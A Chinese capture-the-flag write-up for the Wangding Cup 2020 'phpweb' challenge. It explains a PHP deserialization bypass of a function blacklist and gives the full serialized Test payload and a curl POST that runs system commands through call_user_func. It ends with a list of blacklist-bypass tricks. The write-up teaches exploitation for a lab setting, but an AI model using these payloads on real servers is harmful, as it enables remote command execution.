# [网鼎杯 2020 朱雀组]phpweb

## 题目概述
题目是一个简单的 PHP 页面，页面有一个自动提交的表单，默认调用 `date` 函数显示时间。页面存在函数黑名单过滤，但可以通过 PHP 反序列化绕过。

## 信息收集
1. 访问页面，发现自动提交表单：`func=date`, `p=Y-m-d h:i:s a`
2. 使用 `highlight_file` 读取 `index.php` 源码（不在黑名单中）
3. 分析源码发现：
   - 黑名单过滤危险函数：`exec`, `shell_exec`, `system`, `passthru`, `eval`, `assert` 等
   - 存在 `Test` 类，包含 `__destruct` 魔术方法
   - `__destruct` 调用 `gettime($this->func, $this->p)` → `call_user_func($func, $p)`
   - 黑名单检查只针对直接传入的 `func` 参数，不检查反序列化后的对象属性

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：PHP 反序列化 + 黑名单绕过

**原理**：
1. `call_user_func($func, $p)` 可以动态调用任意函数
2. 黑名单检查在参数传入阶段：`if (!in_array($func, $disable_fun))`
3. 反序列化时，`Test` 对象的 `__destruct` 直接调用 `gettime()`，**不经过黑名单检查**
4. 因此可以构造序列化对象，设置 `$func="system"`, `$p="命令"`，绕过黑名单执行命令

**判断过程**：
- 尝试直接传 `func=system&p=id` → 返回 "Hacker..."，确认有黑名单
- 尝试 `func=highlight_file&p=index.php` → 成功读取源码（不在黑名单）
- 分析源码发现 `Test` 类和 `unserialize` 函数不在黑名单中
- 构造反序列化 payload 绕过黑名单

## 利用过程（Payload + Flag）

**步骤1：构造序列化 payload**
```php
class Test {
    var $p = "cat /tmp/flagoefiu4r93";
    var $func = "system";
}
serialize(new Test());
// O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
```

**步骤2：发送请求**
```bash
curl -X POST "http://target/index.php" \
  -d 'func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}'
```

**步骤3：获取 flag**
```

```

## 知识总结（解题技巧、同类题型套路）
1. **PHP 黑名单绕过套路**：检查是否有反序列化入口、魔术方法调用、动态函数调用
2. **常见绕过方式**：
   - 反序列化 + `__destruct`/`__wakeup` 绕过参数检查
   - 动态函数调用：`call_user_func`, `$func()` 等
   - 不在黑名单的读文件函数：`highlight_file`, `file_get_contents`, `readfile`
3. **序列化构造要点**：注意属性类型（public/private/static 影响序列化格式）、字符串长度精确计算
